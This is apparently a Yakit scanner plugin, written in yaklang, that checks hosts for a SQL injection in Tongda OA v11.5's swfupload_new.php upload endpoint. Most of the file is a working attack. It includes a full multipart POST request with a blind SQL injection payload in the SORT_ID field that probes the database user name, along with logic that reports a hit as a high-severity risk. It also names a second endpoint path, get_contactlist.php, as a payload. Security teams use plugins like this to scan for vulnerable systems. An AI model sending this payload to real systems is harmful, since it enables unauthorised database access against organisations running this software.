# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Go-http-client/1.1
Content-Length: 355
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
Accept-Encoding: gzip

------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0 RLIKE (SELECT  (CASE WHEN (substr(user(),1,1)=0x72) THEN 1 ELSE 0x28 END))
------------GFioQpMK0vv2--`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp, `\u4e0a\u4f20\u6210\u529f\uff01`) && str.MatchAllOfSubString(rsp, "HTTP/1.1 200") {
            yakit.Info("%v 通达OA v11.5 swfupload_new.php SQL注入漏洞", addr)
            risk.NewRisk(
            addr,risk.title("通达OA v11.5 swfupload_new.php SQL注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("通达OA v11.5 swfupload_new.php SQL注入漏洞"),
            risk.type("信息泄露[通达OA v2014]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在通达OA v11.5 swfupload_new.php SQL注入漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
